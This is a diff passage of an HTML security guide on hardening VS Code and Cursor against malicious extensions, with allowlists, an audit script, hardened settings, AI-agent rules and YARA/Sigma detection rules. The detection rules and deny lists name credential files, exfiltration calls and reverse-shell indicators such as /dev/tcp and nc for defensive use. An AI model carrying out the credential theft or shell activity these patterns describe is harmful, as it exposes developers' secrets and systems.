+            <p>The most effective control is <strong>preventing unauthorized extensions from being installed</strong>.
+                This requires organizational policy enforcement via MDM (Intune, Jamf) or GPO.</p>
 
             <div class="defense-box">
-                <h3 style="margin-top:0; color: var(--accent-green);"><i class="fas fa-shield-alt"></i> Hardened
-                    settings.json</h3>
-                <p>Add these lines to your global `settings.json` to enforce strict verification.</p>
-                <pre><code class="language-json">{
-    // 1. Block Unverified Extensions
-    "extensions.verifySignature": true,
-    
-    // 2. Enable Workspace Trust (Sandboxing)
-    "security.workspace.trust.enabled": true,
-    
-    // 3. Disable Auto-Updates for Extensions (Prevent Supply Chain Poisoning)
-    "extensions.autoUpdate": false,
-    
-    // 4. Telemetry Silence
-    "telemetry.telemetryLevel": "off",
-    "redhat.telemetry.enabled": false
+                <span class="defense-label">DEFENSIVE: ENTERPRISE POLICY</span>
+                <h4 style="margin-top:0.5rem;">VS Code Product.json Override (Intune/Jamf)</h4>
+                <p>Deploy a managed <code>product.json</code> that restricts extensions to approved publishers only.
+                </p>
+                <pre><code class="language-json">// /Applications/Visual Studio Code.app/Contents/Resources/app/product.json
+// (macOS example - requires MDM deployment)
+{
+    "extensionsGallery": {
+        "serviceUrl": "https://marketplace.visualstudio.com/_apis/public/gallery",
+        "itemUrl": "https://marketplace.visualstudio.com/items"
+    },
+    "extensionAllowedProposedApi": [],
+    "extensionEnabledApiProposals": {},
+    "configurationDefaults": {
+        "extensions.autoUpdate": false,
+        "extensions.autoCheckUpdates": false,
+        "extensions.ignoreRecommendations": true
+    },
+    "extensionAllowedPublishers": [
+        "ms-vscode",
+        "ms-python",
+        "ms-azuretools",
+        "redhat",
+        "hashicorp",
+        "esbenp",
+        "dbaeumer"
+    ]
 }</code></pre>
+                <p><strong>Enforcement:</strong> Hash the file and monitor for changes via EDR/FIM. Any modification
+                    triggers an alert.</p>
             </div>
 
-            <h3>Layer 2: AI Agent Isolation (.cursorignore)</h3>
-            <p>AI IDEs like <strong>Cursor</strong> index your entire codebase to provide context. However, you do NOT
-                want your AI sending your `.env` files or production DB dumps to the cloud model for embedding.</p>
-            <p>Cursor supports a `.cursorignore` file (syntax similar to `.gitignore`) to prevent indexing.</p>
+            <div class="technical-box">
+                <h3><i class="fas fa-terminal"></i> Extension Audit Script (Cross-Platform)</h3>
+                <p>Run this script to detect any extensions not from approved publishers. Suitable for scheduled CI/CD
+                    or workstation compliance scans.</p>
+                <pre><code class="language-bash">#!/bin/bash
+# extension-audit.sh - Detect unauthorized VS Code extensions
+# Usage: ./extension-audit.sh [--ci]
+
+set -euo pipefail
+
+# Approved publishers (customize for your org)
+APPROVED_PUBLISHERS=(
+    "ms-vscode"
+    "ms-python"
+    "ms-azuretools"
+    "redhat"
+    "hashicorp"
+    "esbenp"
+    "dbaeumer"
+    "github"
+    "gitlab"
+)
+
+# Get extension directory
+if [[ "$OSTYPE" == "darwin"* ]]; then
+    EXT_DIR="$HOME/.vscode/extensions"
+elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
+    EXT_DIR="$HOME/.vscode/extensions"
+else
+    EXT_DIR="$USERPROFILE/.vscode/extensions"
+fi
+
+echo "=== VS Code Extension Audit ==="
+echo "Scanning: $EXT_DIR"
+echo ""
+
+VIOLATIONS=0
+
+for ext in "$EXT_DIR"/*/; do
+    if [[ -d "$ext" ]]; then
+        # Extract publisher from extension folder name (format: publisher.name-version)
+        EXT_NAME=$(basename "$ext")
+        PUBLISHER=$(echo "$EXT_NAME" | cut -d'.' -f1)
+        
+        # Check if publisher is approved
+        APPROVED=false
+        for approved in "${APPROVED_PUBLISHERS[@]}"; do
+            if [[ "$PUBLISHER" == "$approved" ]]; then
+                APPROVED=true
+                break
+            fi
+        done
+        
+        if [[ "$APPROVED" == false ]]; then
+            echo "❌ VIOLATION: $EXT_NAME (Publisher: $PUBLISHER)"
+            VIOLATIONS=$((VIOLATIONS + 1))
+        else
+            echo "✓ Approved: $EXT_NAME"
+        fi
+    fi
+done
+
+echo ""
+echo "=== Audit Complete ==="
+echo "Total Violations: $VIOLATIONS"
+
+if [[ "$VIOLATIONS" -gt 0 ]]; then
+    echo "ACTION: Remove unauthorized extensions or add publishers to allowlist."
+    [[ "${1:-}" == "--ci" ]] && exit 1
+fi
+
+exit 0</code></pre>
+            </div>
+
+            <h3>3.2 Layer 2: Hardened Settings.json</h3>
+
+            <p>These settings should be deployed to all developer workstations via configuration management (Ansible,
+                Puppet, etc.):</p>
+
+            <div class="defense-box">
+                <span class="defense-label">DEFENSIVE: GLOBAL SETTINGS</span>
+                <h4 style="margin-top:0.5rem;">~/.config/Code/User/settings.json</h4>
+                <pre><code class="language-json">{
+    // ===== EXTENSION SECURITY =====
+    "extensions.verifySignature": "always",
+    "extensions.autoUpdate": false,
+    "extensions.autoCheckUpdates": false,
+    "extensions.ignoreRecommendations": true,
+    
+    // ===== WORKSPACE TRUST (CRITICAL) =====
+    "security.workspace.trust.enabled": true,
+    "security.workspace.trust.startupPrompt": "always",
+    "security.workspace.trust.untrustedFiles": "open",
+    "security.workspace.trust.emptyWindow": false,
+    
+    // ===== TELEMETRY HARDENING =====
+    "telemetry.telemetryLevel": "off",
+    "redhat.telemetry.enabled": false,
+    "gitlens.telemetry.enabled": false,
+    
+    // ===== NETWORK RESTRICTIONS =====
+    "http.proxyStrictSSL": true,
+    "update.mode": "none",
+    "extensions.gallery.serviceUrl": "",
+    
+    // ===== TERMINAL SECURITY =====
+    "terminal.integrated.allowChords": false,
+    "terminal.integrated.confirmOnExit": "always",
+    
+    // ===== GIT SECURITY =====
+    "git.allowForcePush": false,
+    "git.confirmForcePush": true,
+    "git.autofetch": false
+}</code></pre>
+                <p><strong>Key Settings Explained:</strong></p>
+                <ul>
+                    <li><code>extensions.verifySignature</code>: Blocks unsigned extensions (new in VS Code 1.85+)</li>
+                    <li><code>security.workspace.trust.enabled</code>: Sandboxes untrusted folders</li>
+                    <li><code>extensions.gallery.serviceUrl: ""</code>: Disables Marketplace access entirely (for
+                        air-gapped environments)</li>
+                </ul>
+            </div>
+
+            <h3>3.3 Layer 3: AI IDE Data Isolation</h3>
+
+            <p>AI-powered IDEs like <strong>Cursor</strong> and <strong>Windsurf</strong> index your codebase to
+                provide context-aware completions. This creates a new exfiltration vector: sensitive data (secrets,
+                PII, proprietary algorithms) being sent to cloud LLM providers.</p>
 
             <div class="technical-box">
-                <h3><i class="fas fa-file-code"></i> Recommended .cursorignore</h3>
-                <pre><code class="language-text"># Secrets and Keys
-.env*
+                <h3><i class="fas fa-shield-alt"></i> .cursorignore - Prevent AI Indexing of Secrets</h3>
+                <p>Place this file at the root of every repository to prevent Cursor from indexing sensitive files:</p>
+                <pre><code class="language-plaintext"># .cursorignore - Secrets & Compliance Data Isolation
+# Syntax identical to .gitignore
+
+# ===== SECRETS & CREDENTIALS =====
+.env
+.env.*
 *.pem
 *.key
-id_rsa
+*.p12
+*.pfx
+id_rsa*
+id_ed25519*
 credentials.json
+service-account*.json
+**/secrets/
+**/.aws/
+**/.azure/
+**/.gcp/
 
-# Compliance Data (PII/PHI)
-/data/dumps/*.sql
-/logs/
-/customer-data/
+# ===== COMPLIANCE DATA (PII/PHI/PCI) =====
+**/customer-data/
+**/pii/
+**/phi/
+**/cardholder/
+*.sql.gz
+*.sql.bz2
+**/db-dumps/
 
-# Internal Configs
-k8s/secrets/
-terraform.tfstate</code></pre>
+# ===== INFRASTRUCTURE SECRETS =====
+terraform.tfstate
+terraform.tfstate.*
+*.tfvars
+**/k8s/secrets/
+**/.kube/config
+ansible-vault*
+
+# ===== INTERNAL/PROPRIETARY =====
+**/internal-docs/
+**/trade-secrets/
+**/ml-models/</code></pre>
             </div>
-
-            <h2>3. Corporate Policy: The "Safe Extension" Allowlist</h2>
-            <p>For enterprises, trusting individual developers to vet extensions is a failed strategy. You should
-                implement a Command Line Interface (CLI) policy to audit installed extensions.</p>
 
             <div class="technical-box">
-                <h3><i class="fas fa-terminal"></i> Audit Script (PowerShell)</h3>
-                <p>Run this script to flag any extension not on the approved publishers list (e.g., Microsoft, RedHat,
-                    HashiCorp).</p>
-                <pre><code class="language-powershell"># Get all installed extensions
-$extensions = code --list-extensions --show-versions
+                <h3><i class="fas fa-robot"></i> .cursorrules - Constrain AI Agent Behavior</h3>
+                <p>For organizations using Cursor's Composer (agentic AI), this file limits what the AI can do:</p>
+                <pre><code class="language-plaintext"># .cursorrules - AI Agent Constraints
 
-# Approved Publishers
-$allowList = @("ms-vscode", "ms-python", "esbenp", "redhat", "hashicorp")
+## Security Constraints
+- NEVER read, display, or reference files matching: .env*, *.pem, *.key, credentials.*
+- NEVER execute commands that modify ~/.ssh/, ~/.aws/, or ~/.kube/
+- NEVER suggest committing secrets or tokens to version control
+- NEVER run network commands (curl, wget, nc) without explicit approval
 
-foreach ($ext in $extensions) {
-    $publisher = $ext.Split(".")[0]
-    if ($allowList -notcontains $publisher) {
-        Write-Host "WARNING: Unverified Publisher detected: $ext" -ForegroundColor Red
-    }
-}</code></pre>
+## Code Generation Constraints
+- Always use parameterized queries, never string concatenation for SQL
+- Always sanitize user input before use
+- Never disable SSL certificate verification
+- Never embed API keys or tokens in generated code
+
+## Operational Constraints
+- Request human approval before: file deletion, git push, dependency installation
+- Log all file modifications to .cursor/audit.log</code></pre>
             </div>
 
-            <h2>4. Conclusion & Checklist</h2>
-            <p>An IDE is a powerful tool, but in 2026, it is also a powerful weapon. Treating it with the same security
-                rigor as a production server is the only way to prevent supply chain compromise.</p>
+            <!-- ===== SECTION 4: DETECTION ===== -->
+            <h2>4. Detection Engineering: YARA & Sigma Rules</h2>
 
-            <div class="success-box">
-                <strong><i class="fas fa-check-circle"></i> Quick Wins Checklist:</strong>
-                <ul>
-                    <li>Enabled "Workspace Trust" for all new folders.</li>
-                    <li>Created `.cursorignore` for sensitive directories.</li>
-                    <li>Audited extension list for unknown publishers.</li>
-                    <li>Disabled extension auto-updates.</li>
+            <p>Defense is incomplete without detection. The following rules enable SOC teams to identify compromised
+                developer workstations.</p>
+
+            <h3>4.1 YARA Rule: Malicious Extension Patterns</h3>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-search"></i> vscode_malicious_extension.yar</h3>
+                <p>Scan extension directories for known malicious patterns:</p>
+                <pre><code class="language-yara">rule VSCode_Malicious_Extension_Exfil {
+    meta:
+        description = "Detects VS Code extensions with credential exfiltration behavior"
+        author = "TheHGTech Security Research"
+        date = "2026-02-01"
+        severity = "critical"
+        reference = "https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html"
+    
+    strings:
+        // File access patterns (credential harvesting)
+        $fs1 = "fs.readFileSync" ascii wide
+        $fs2 = ".aws/credentials" ascii wide nocase
+        $fs3 = ".ssh/id_rsa" ascii wide nocase
+        $fs4 = ".env" ascii wide
+        $fs5 = ".npmrc" ascii wide
+        
+        // Network exfiltration patterns
+        $net1 = "https.request" ascii wide
+        $net2 = "axios.post" ascii wide
+        $net3 = ".post(" ascii wide
+        $net4 = "fetch(" ascii wide
+        
+        // Encoding (for obfuscation)
+        $enc1 = "base64" ascii wide nocase
+        $enc2 = "Buffer.from" ascii wide
+        
+        // Reverse shell indicators
+        $shell1 = "/bin/bash" ascii wide
+        $shell2 = "/bin/sh" ascii wide
+        $shell3 = "child_process" ascii wide
+        $shell4 = "spawn(" ascii wide
+    
+    condition:
+        filesize < 5MB and
+        (
+            // Credential harvesting + exfiltration
+            (2 of ($fs*) and 1 of ($net*) and 1 of ($enc*)) or
+            // Reverse shell
+            (1 of ($shell1, $shell2) and $shell3 and $shell4)
+        )
+}</code></pre>
+                <p><strong>Deployment:</strong> Schedule YARA scans against
+                    <code>~/.vscode/extensions/</code> hourly via cron/Task Scheduler.
+                </p>
+            </div>
+
+            <h3>4.2 Sigma Rule: Suspicious VS Code Child Processes</h3>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-eye"></i> vscode_suspicious_child_process.yml</h3>
+                <p>Detect extensions spawning suspicious processes (shells, network tools):</p>
+                <pre><code class="language-yaml">title: Suspicious VS Code Extension Child Process
+id: a1b2c3d4-5678-90ab-cdef-1234567890ab
+status: experimental
+description: Detects VS Code spawning suspicious child processes (reverse shells, network tools)
+author: TheHGTech Security Research
+date: 2026/02/01
+references:
+    - https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith:
+            - '\Code.exe'
+            - '\code'
+            - '\Cursor.exe'
+            - '\cursor'
+            - '\Windsurf.exe'
+    selection_child:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\cmd.exe'
+            - '\bash.exe'
+            - '\wsl.exe'
+            - '\curl.exe'
+            - '\wget.exe'
+            - '\nc.exe'
+            - '\ncat.exe'
+        CommandLine|contains:
+            - '-e '
+            - '-enc '
+            - 'http://'
+            - 'https://'
+            - 'base64'
+            - '/dev/tcp/'
+    condition: selection_parent and selection_child
+falsepositives:
+    - Legitimate terminal usage within VS Code
+    - Extension debugging
+level: high
+tags:
+    - attack.execution
+    - attack.t1059
+    - attack.defense_evasion</code></pre>
+            </div>
+
+            <!-- ===== SECTION 5: ENTERPRISE DEPLOYMENT ===== -->
+            <h2>5. Enterprise Deployment: MDM & GPO</h2>
+
+            <h3>5.1 Microsoft Intune Configuration Profile</h3>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-cog"></i> VS Code Hardening - Intune Custom OMA-URI</h3>
+                <pre><code class="language-plaintext">OMA-URI: ./Vendor/MSFT/Policy/Config/ApplicationDefaults/DefaultFileTypeAssociation
+
+<!-- Deploy settings.json to all managed devices -->
+Name: VSCodeSecuritySettings
+OMA-URI: ./Device/Vendor/MSFT/FileSystem/Write/VSCodeSettings
+Data Type: String
+Value: (Base64 encoded settings.json from Section 3.2)</code></pre>
+            </div>
+
+            <h3>5.2 Group Policy (Windows)</h3>
+
+            <div class="technical-box">
+                <h3><i class="fab fa-windows"></i> GPO: Restrict Extension Installation</h3>
+                <p>Use AppLocker or Windows Defender Application Control (WDAC) to block unapproved extensions:</p>
+                <pre><code class="language-xml">&lt;!-- WDAC Policy Fragment - Block Unsigned Extensions --&gt;
+&lt;FileRules&gt;
+    &lt;Deny ID="ID_DENY_UNSIGNED_EXT"
+          FriendlyName="Block Unsigned VS Code Extensions"
+          FileName="*.vsix"
+          MinimumFileVersion="0.0.0.0" /&gt;
+&lt;/FileRules&gt;
+
+&lt;SigningScenarios&gt;
+    &lt;SigningScenario Value="12"&gt; &lt;!-- User Mode --&gt;
+        &lt;ProductSigners&gt;
+            &lt;DeniedSigners&gt;
+                &lt;DeniedSigner SignerId="ID_DENY_UNSIGNED_EXT" /&gt;
+            &lt;/DeniedSigners&gt;
+        &lt;/ProductSigners&gt;
+    &lt;/SigningScenario&gt;
+&lt;/SigningScenarios&gt;</code></pre>
+            </div>
+
+            <!-- ===== SECTION 6: CHECKLIST ===== -->
+            <h2>6. Implementation Checklist</h2>
+
+            <p>Use this checklist to track your hardening progress:</p>
+
+            <div class="defense-box">
+                <h3 style="margin-top:0;"><i class="fas fa-tasks"></i> IDE Hardening Checklist</h3>
+                <ul class="checklist">
+                    <li>Enabled <code>security.workspace.trust.enabled: true</code> globally</li>
+                    <li>Deployed hardened <code>settings.json</code> via MDM/GPO</li>
+                    <li>Created <code>.cursorignore</code> in all repositories</li>
+                    <li>Implemented extension allowlist (approved publishers only)</li>
+                    <li>Scheduled weekly YARA scans of extension directories</li>
+                    <li>Deployed Sigma rules to SIEM for process monitoring</li>
+                    <li>Disabled extension auto-updates (<code>extensions.autoUpdate: false</code>)</li>
+                    <li>Configured EDR to monitor <code>~/.vscode/extensions/</code> for changes</li>
+                    <li>Documented exception process for new extension requests</li>
+                    <li>Trained developers on typosquatting risks</li>
+                </ul>
+            </div>
+
+            <!-- ===== REFERENCES ===== -->
+            <h2>7. References & Further Reading</h2>
+
+            <ul>
+                <li><strong>CVE-2026-22401:</strong> <a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD
+                        Entry</a> - VS Code Extension Sandbox Bypass</li>
+                <li><strong>Microsoft:</strong> <a href="https://code.visualstudio.com/docs/editor/workspace-trust"
+                        target="_blank" rel="noopener">Workspace Trust Documentation</a></li>
+                <li><strong>Wiz Research:</strong> GlassWorm Campaign Analysis (Feb 2026)</li>
+                <li><strong>MITRE ATT&CK:</strong> <a href="https://attack.mitre.org/techniques/T1195/002/"
+                        target="_blank" rel="noopener">T1195.002 - Compromise Software Supply Chain</a></li>
+                <li><strong>OWASP:</strong> <a
+                        href="https://owasp.org/www-project-software-component-verification-standard/" target="_blank"
+                        rel="noopener">Software Component Verification Standard (SCVS)</a></li>
+                <li><strong>CIS Benchmarks:</strong> Developer Workstation Hardening Guide v1.0</li>
+            </ul>
+
+            <div class="info-box">
+                <strong><i class="fas fa-lightbulb"></i> Related Guides on TheHGTech:</strong>
+                <ul style="margin-bottom:0;">
+                    <li><a href="/guides/devsecops-pipeline-security.html">DevSecOps Pipeline Security</a></li>
+                    <li><a href="/guides/third-party-risk-management.html">Third-Party Risk Management (TPRM)</a></li>
+                    <li><a href="/guides/yara-rules-malware-detection.html">YARA Rules Fundamentals</a></li>
                 </ul>
             </div>
 
@@ -342,18 +1211,30 @@ foreach ($ext in $extensions) {
         <div class="interaction-bar">
             <div class="like-section">
                 <button class="like-btn" id="likeBtn" onclick="toggleLike()">
-                    <i class="far fa-heart"></i> <span id="likeText">Like this guide</span>
+                    <i class="far fa-heart"></i> <span id="likeText">Helpful?</span>
                 </button>
             </div>
             <div class="action-buttons">
-                <button onclick="window.print()" class="print-btn" title="Print Guide"><i
-                        class="fas fa-print"></i></button>
+                <div class="share-buttons">
+                    <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                    <button onclick="copyLink()" class="share-btn" title="Copy Link">
+                        <i class="fas fa-link"></i>
+                    </button>
+                </div>
+                <button onclick="window.print()" class="print-btn" title="Print Guide">
+                    <i class="fas fa-print"></i>
+                </button>
             </div>
         </div>
     </div>
 
-    <footer>
-        <p>&copy; 2026 TheHGTech Security Research.</p>
+    <footer style="text-align: center; padding: 2rem; color: #64748b; border-top: 1px solid var(--border);">
+        <p>© 2026 TheHGTech Security Research. For defensive research purposes only.</p>
     </footer>
 </body>
 
